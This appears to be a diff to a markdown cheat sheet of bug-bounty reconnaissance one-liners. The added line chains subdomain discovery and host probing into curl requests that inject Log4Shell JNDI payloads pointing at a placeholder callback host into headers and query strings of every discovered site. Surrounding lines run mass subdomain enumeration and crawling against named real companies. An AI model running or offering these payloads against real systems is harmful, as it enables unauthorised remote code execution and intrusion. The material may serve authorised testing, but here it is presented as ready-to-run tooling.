@@ -50,6 +50,8 @@ $env:Path += ";C:\Python27\Scripts"
 
 ### Open-source intelligence (OSINT)
 ```
+subfinder -d example.com -silent |puredns resolve -q |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://Yourburpcolab/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://Yourburpcolab/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://Yourburpcolab/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done
+
 assetfinder -subs-only http://paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
 
 rush -j100 -i bitquark-subdomains-top100000.txt 'curl -s -L "https://dns.google.com/resolve?name{}.tesla.com&type=A&cd=true" | sed "s#\"#\n#g;s# #\n#g" | grep "tesla"' | sed 's#\.$##g' | anew teslaDomains 
